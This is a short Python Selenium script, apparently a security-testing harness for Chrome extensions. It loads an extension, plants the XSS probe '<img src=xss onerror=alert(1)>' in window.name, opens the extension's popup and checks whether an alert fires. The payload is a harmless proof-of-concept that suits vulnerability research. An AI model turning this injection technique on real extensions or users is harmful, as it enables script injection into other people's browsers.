from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from os import path
import hashlib
from selenium.common.exceptions import NoAlertPresentException


def get_ext_id(path_to_extension):
    abs_path = path.abspath(path_to_extension)
    m = hashlib.sha256()
    m.update(abs_path.encode("utf-8"))
    ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
    url_path = f"chrome-extension://{ext_id}/popup.html"
    return url_path, abs_path


def process_payload(url_path, abs_path):
    options = webdriver.ChromeOptions()
    options.add_experimental_option('detach', True)
    load_ext_arg = "load-extension=" + abs_path
    options.add_argument(load_ext_arg)
    options.add_argument("--enable-logging")
    driver = webdriver.Chrome('./chromedriver', options=options)

    driver.get('https://www.example.com')
    original = driver.current_window_handle
    payload = '<img src=xss onerror=alert(1)>'
    print('te')
    driver.execute_script(f"window.name = '{payload}';")
    print('te')
    driver.switch_to.new_window('tab')
    driver.get(url_path)
    driver.switch_to.window(original)

    # driver.get('https://www.example.com')

    # payload = '<img src=xss onerror=alert(1)>'
    # print('te')
    # driver.execute_script(f"window.name = '{payload}';")
    # print('te')


    # driver.switch_to.window(original)


    try:
        # wait 3 seconds to see if alert is detected
        WebDriverWait(driver, 2).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        print('+ Alert Detected +')
    except TimeoutException:
        print('= No alerts detected =')
    
    # change back to popup.html to try another payload
    
    # close driver after  loop gaodim
    # driver.quit()




url_path, abs_path = get_ext_id('h1-replacer(v3)')
process_payload(url_path, abs_path)